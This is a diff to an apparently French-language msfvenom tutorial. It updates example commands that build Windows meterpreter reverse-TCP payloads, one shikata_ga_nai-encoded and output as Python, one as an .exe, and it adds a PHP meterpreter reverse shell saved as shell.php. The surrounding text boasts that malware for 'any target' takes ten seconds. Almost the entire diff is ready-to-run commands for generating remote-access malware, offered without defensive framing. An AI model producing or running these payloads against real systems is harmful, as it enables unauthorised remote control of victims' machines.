@@ -227,11 +227,14 @@ msfvenom -lall
 ### apres si vous connaissait bien les commande en 10 seconde votre malwar est fait pour n import quel cible , c est la puissance de msfvenom
 
 
-exemple(remplacer votre ip) :
+exemple(remplacer votre ip,le port que vous voulez , votre chemin,le nom de fichier, un autre parametre comme -e avec de l encoding ,une option binaire...etc) :
 
 ````bash
-msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.4.4 lport=4444 -e x86/shikata_ga_nai -b "\x00" -f python
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=4444 -e x86/shikata_ga_nai -b "\x00" -f python
 ````
 ````bash
-msfvenom -p windows/meterpreter/reverse_tcp --platform windows --arch x86 -f exe lhost=10.10.4.4 lport=8000 -o /home/kali/Desktop/fichier.exe
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows --arch x86 -f exe lhost=192.168.56.101 lport=8000 -o /home/kali/Desktop/fichier.exe
+````
+````bash
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7000 -f raw > /home/kali/Desktop/shell.php
 ````
